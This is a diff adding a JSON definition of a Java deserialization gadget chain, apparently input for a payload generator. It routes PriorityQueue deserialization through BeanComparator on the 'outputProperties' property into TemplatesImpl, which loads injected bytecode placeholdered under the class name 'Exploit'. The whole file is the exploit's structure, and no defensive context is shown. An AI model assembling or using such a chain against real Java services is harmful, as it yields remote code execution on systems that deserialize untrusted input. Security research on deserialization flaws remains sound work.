@@ -1,0 +1,27 @@
+{
+  "chain_type": "CB_TemplatesImpl - Class loading via PriorityQueue + BeanComparator",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject->heapify->siftDown->comparator.compare",
+  "links": [
+    {
+      "class": "org.apache.commons.beanutils.BeanComparator",
+      "field_overrides": {
+        "property": "outputProperties",
+        "comparator": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "java.util.Collections$ReverseComparator",
+      "field_overrides": {}
+    },
+    {
+      "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      "field_overrides": {
+        "_bytecodes": "PLACEHOLDER_BYTECODE",
+        "_name": "Exploit",
+        "_tfactory": {}
+      }
+    }
+  ],
+  "sink_method": "TemplatesImpl.getOutputProperties"
+}
